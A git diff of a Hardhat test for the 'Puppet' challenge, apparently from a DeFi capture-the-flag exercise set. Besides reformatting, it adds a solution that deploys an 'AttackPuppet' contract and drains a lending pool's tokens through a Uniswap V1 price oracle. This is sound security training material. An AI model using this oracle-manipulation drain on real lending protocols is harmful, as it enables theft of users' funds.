@@ -1,6 +1,6 @@
 const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
 const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
-
+ 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
@@ -54,10 +54,7 @@ describe('[Challenge] Puppet', function () {
         );
     
         // Add initial token and ETH liquidity to the pool
-        await token.approve(
-            uniswapExchange.address,
-            UNISWAP_INITIAL_TOKEN_RESERVE
-        );
+        await token.approve(uniswapExchange.address, UNISWAP_INITIAL_TOKEN_RESERVE);
         await uniswapExchange.addLiquidity(
             0,                                                          // min_liquidity
             UNISWAP_INITIAL_TOKEN_RESERVE,
@@ -66,35 +63,34 @@ describe('[Challenge] Puppet', function () {
         );
         
         // Ensure Uniswap exchange is working as expected
-        expect(
-            await uniswapExchange.getTokenToEthInputPrice(
-                10n ** 18n,
-                { gasLimit: 1e6 }
-            )
-        ).to.be.eq(
-            calculateTokenToEthInputPrice(
-                10n ** 18n,
-                UNISWAP_INITIAL_TOKEN_RESERVE,
-                UNISWAP_INITIAL_ETH_RESERVE
-            )
-        );
+        expect(await uniswapExchange.getTokenToEthInputPrice(10n ** 18n, { gasLimit: 1e6 })).to.be.eq(calculateTokenToEthInputPrice(10n ** 18n, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE));
         
         // Setup initial token balances of pool and player accounts
         await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
         await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
 
         // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
-        expect(
-            await lendingPool.calculateDepositRequired(10n ** 18n)
-        ).to.be.eq(2n * 10n ** 18n);
-
-        expect(
-            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
-        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
+        expect(await lendingPool.calculateDepositRequired(10n ** 18n)).to.be.eq(2n * 10n ** 18n);
+        expect(await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
     });
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        [,,this.player2] = await ethers.getSigners();
+
+
+        const AttackerContractFactory = await ethers.getContractFactory('AttackPuppet', this.player2);
+        this.attackerContract = await AttackerContractFactory.deploy(
+            token.address, uniswapExchange.address, lendingPool.address
+        )
+
+        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
+ 
+        token.connect(player).transfer(this.attackerContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await this.attackerContract.attack({value: 11n * 10n ** 18n});
+        await token.connect(this.player2).transfer(player.address, await token.balanceOf(this.player2.address));
+
+        expect(await ethers.provider.getBalance(player.address)).to.lt(PLAYER_INITIAL_ETH_BALANCE);
     });
 
     after(async function () {
@@ -103,12 +99,7 @@ describe('[Challenge] Puppet', function () {
         expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
         
         // Player has taken all tokens from the pool       
-        expect(
-            await token.balanceOf(lendingPool.address)
-        ).to.be.eq(0, 'Pool still has tokens');
-
-        expect(
-            await token.balanceOf(player.address)
-        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
+        expect(await token.balanceOf(lendingPool.address)).to.be.eq(0, 'Pool still has tokens');
+        expect(await token.balanceOf(player.address)).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
     });
 });
